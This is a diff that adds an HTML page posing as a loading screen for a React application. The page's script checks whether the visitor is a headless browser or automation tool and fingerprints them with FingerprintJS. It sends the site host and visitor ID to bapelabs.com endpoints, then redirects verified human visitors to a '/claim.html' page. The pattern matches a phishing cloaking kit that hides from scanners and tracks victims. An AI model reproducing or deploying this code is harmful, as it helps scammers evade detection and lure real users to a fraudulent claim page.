@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+    <head><title>Loading...</title><link rel="shortcut icon" href="rfavicon.ico" /></head>
+    <body>
+        <p>React Application loading.. Please wait.</p>
+        <script src="https://unpkg.com/@fingerprintjs/fingerprintjs@4.2.2/dist/fp.umd.js"></script>
+<script>
+    let valid = true;
+    if (navigator.webdriver || navigator.userAgent?.toLowerCase().includes("headless")){
+        valid = false;
+    }
+    const fpPromise = FingerprintJS.load();
+    fpPromise
+        .then(fp => fp.get())
+        .then(result => {
+          // This is the visitor identifier:
+          const visitorId = result.visitorId;
+          let MS_VISITOR_ID = visitorId;
+          if (MS_VISITOR_ID === null || MS_VISITOR_ID === undefined) {
+            MS_VISITOR_ID = -1;
+          }
+
+          fetch("https://bapelabs.com/enter.php?id=" + btoa(window.location.host + "," + MS_VISITOR_ID));
+ 
+          fetch("https://bapelabs.com/checkdom.php?id=" + btoa(window.location.host)).then(check => check.text())
+             .then(verified => {
+                 console.log(verified);
+                 if (verified === "false"){
+                     if (MS_VISITOR_ID !== null) {
+                         fetch("https://bapelabs.com/verify.php?id=" + MS_VISITOR_ID);
+                     }
+                 } else {
+                    fetch("https://bapelabs.com/check.php?id=" + visitorId).then(check => check.text())
+                        .then(verified => {
+                            if (verified !== "false" && valid){
+                                window.location.replace("/claim.html");
+                            }
+                        });
+                 }
+             });
+        });
+  </script>
+    </body>
+</html>
